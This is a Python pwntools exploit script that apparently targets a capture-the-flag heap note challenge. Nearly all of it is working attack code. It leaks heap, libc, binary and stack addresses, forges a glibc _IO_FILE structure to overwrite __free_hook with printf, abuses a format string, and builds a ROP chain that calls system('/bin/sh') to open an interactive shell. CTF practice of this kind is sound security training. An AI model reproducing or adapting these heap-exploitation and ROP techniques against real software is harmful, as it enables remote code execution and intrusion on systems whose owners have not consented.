from pwn import *


context.arch = "amd64"
libc = ELF("../challenge/libc.so.6")
elf = ELF("../challenge/new_chall")


def connexion():
    if args.LOCAL:
        p = process("./new_chall")
        return p
    elif args.REMOTE:
        HOST, PORT = "localhost", 9005
        p = remote(HOST, PORT)
        return p
    else:
        exit()


def add_note(size, content):
    p.sendlineafter("option: ", str(1))
    p.sendlineafter("Size: ", str(size))
    p.sendlineafter("content: ", content)


def edit_note(index, content):
    p.sendlineafter("option: ", str(3))
    p.sendlineafter("Index: ", str(index))
    p.sendlineafter("Content: ", content)


def remove_note(index):
    p.sendlineafter("option: ", str(2))
    p.sendlineafter("index: ", str(index))


def view_note(index):
    p.sendlineafter("option: ", str(4))
    p.sendlineafter("Index: ", str(index))


def forge_file_structure(pointer, IO_FILE_LOCK, WILD_DATA, IO_FILE_JUMPS):

    struct_file = p64(0xFBAD208B & ~(4))  # _flags
    struct_file += p64(pointer) * 4  # _IO_read_ptr to _IO_write_base
    struct_file += p64(pointer)  # _IO_write_ptr
    struct_file += p64(pointer)  # _IO_write_end
    struct_file += p64(pointer)  # _IO_buf_base
    struct_file += p64(pointer + 0x1000)  # _IO_buf_end
    struct_file += p64(0) * 4  # _IO_save_base to _markers
    struct_file += p64(0x0)  # _chain
    struct_file += p32(0)  # _fileno
    struct_file += p32(0)  # _flags2
    struct_file += p64(0xFFFFFFFFFFFFFFFF)  # _old_offset
    struct_file += p16(0)  # _cur_column
    struct_file += p8(0)  # _vtable_offset
    struct_file += b"\0"  # _shortbuf
    struct_file += p32(0)  # padding between shortbuf and _lock
    struct_file += p64(IO_FILE_LOCK)  # _lock
    struct_file += p64(0xFFFFFFFFFFFFFFFF)  # _offset
    struct_file += p64(0)  # _codecvt
    struct_file += p64(WILD_DATA)  # _wide_data
    struct_file += p64(0)  # _freeres_list
    struct_file += p64(0)  # _freeres_buf
    struct_file += p64(0)  # __pad5
    struct_file += p32(0xFFFFFFFF)  # _mode
    struct_file += b"\0" * 20  # _unused2
    struct_file += p64(IO_FILE_JUMPS)  # vtable

    return struct_file


def main():
    global p
    p = connexion()

    for i in range(4):
        add_note(0x20, b"A")

    remove_note(0)
    remove_note(1)
    remove_note(2)
    remove_note(3)
    add_note(0x20, b"")  # 0
    view_note(0)
    p.recvline()
    heap_leak = p.recvline().rstrip()
    heap_leak = b"\xe1" + heap_leak
    heap_leak = heap_leak.ljust(8, b"\x00")
    heap_leak = u64(heap_leak)
    log.info(f"heap leak: {hex(heap_leak)}")
    heap_base = heap_leak - 0x14E1
    log.info(f"heap base: {hex(heap_base)}")

    #! leaking libc
    add_note(0x430, b"AAAAA")  # 1
    add_note(0x430, b"BBBBB")  # 2

    remove_note(1)
    remove_note(2)
    add_note(0x430, b"")  # 1
    view_note(1)
    p.recvline()
    libc_leak = p.recvline().rstrip()
    libc_leak = b"\xa0" + libc_leak
    libc_leak = libc_leak.ljust(8, b"\x00")
    libc_leak = u64(libc_leak)
    libc_base = libc_leak - 0x1CABA0
    log.info(f"libc leak : {hex(libc_leak)}")
    log.info(f"libc base: {hex(libc_base)}")
    free_hook = libc_base + 0x1CCE48
    log.info(f"free hook: {hex(free_hook)}")
    printf = libc_base + 0x3FC90
    log.info(f"printf: {hex(printf)}")

    #! leaking binary base
    BIN_INDEX = -11
    STDIN_INDEX = -6
    view_note(BIN_INDEX)
    binary_leak = p.recvline().rstrip().ljust(8, b"\x00")
    binary_leak = u64(binary_leak)
    log.info(f"binary leak: {hex(binary_leak)}")

    #! leaking stack addr
    add_note(0x20, b"%36$p\x00")  # 2
    add_note(0x20, b"./flag.txt\x00")  # 3
    _IO_stdfile_0_lock = libc_base + 0x1CC7F0
    log.info(f"_IO_stdfile_0_lock: {hex(_IO_stdfile_0_lock)}")
    _IO_wide_data_0 = libc_base + 0x1CAA60
    log.info(f"_IO_wide_data_0: {hex(_IO_wide_data_0)}")
    _IO_file_jumps = libc_base + 0x1C74A0
    log.info(f"_IO_file_jumps: {hex(_IO_file_jumps)}")
    file_struct = forge_file_structure(
        free_hook - 8, _IO_stdfile_0_lock, _IO_wide_data_0, _IO_file_jumps
    )

    for i in range(10):
        remove_note(10)

    add_note(0x430, file_struct)
    payload = p64(0) + p64(printf)
    p.recvuntil("option: ")
    p.sendline(payload)
    p.sendline(b"\x00")
    remove_note(2)
    stack_leak = p.recvuntil("Note", drop=True)
    stack_leak = int(stack_leak, 16)
    log.info(f"stack leak: {hex(stack_leak)}")
    main_return_addr = stack_leak - 0xE8
    log.info(f"main_return_addr: {hex(main_return_addr)}")

    rw_section = binary_leak + 0x58 + 0x40
    log.info(f"rw_section: {hex(rw_section)}")
    flag_txt = heap_base + 0x460
    log.info(f"flag: {hex(flag_txt)}")

    #! gadgets
    elf.address = binary_leak - 0x4008
    log.info(f"binary base: {hex(elf.address)}")
    pop_rsi_r15 = 0x00000000000018E1 + elf.address
    log.info(f"pop rsi 15: {hex(pop_rsi_r15)}")
    pop_rdi = elf.address + 0x00000000000018E3
    syscall = elf.address + 0x0000000000001875
    ret = elf.address + 0x000000000000101A
    libc.address = libc_leak - 0x1ECBA0
    pop_rdx = libc.address + 0x0000000000142C92
    pop_rax = libc.address + 0x0000000000036174
    log.info(f"pop rdx: {hex(pop_rdx)}")
    log.info(f"pop rax: {hex(pop_rax)}")
    log.info(f"syscall: {hex(syscall)}")
    log.info(f"pop rdi: {hex(pop_rdi)}")
    add_note_return_addr = stack_leak - 0x110 + 0x8
    log.info(f"add_note_return address: {hex(add_note_return_addr)}")

    file_struct = forge_file_structure(
        add_note_return_addr - 8, _IO_stdfile_0_lock, _IO_wide_data_0, _IO_file_jumps
    )

    add_note(0x430, file_struct)
    offset = 8
    ropchain = b"A" * offset
    #! open flag.txt file
    puts_plt = binary_leak - 0x2E68
    log.info(f"puts@plt: {hex(puts_plt)}")
    main_addr = binary_leak - 0x2C7F
    fgets_plt = binary_leak - 0x2DE8
    log.info(f"fgets@plt: {hex(fgets_plt)}")

    system = libc_base + 0x30290
    log.info(f"system at: {hex(system)}")
    bin_sh = next(libc.search(b"/bin/sh"))
    log.info(f"/bin/sh addr: {hex(bin_sh)}")
    ropchain = b"A" * 8
    ropchain += p64(ret)
    ropchain += p64(pop_rdi)
    ropchain += p64(bin_sh)
    ropchain += p64(system)
    p.sendlineafter("option: ", ropchain)
    # gdb.attach(p)
    p.interactive()


if __name__ == "__main__":
    main()

# leaked addr - return addr
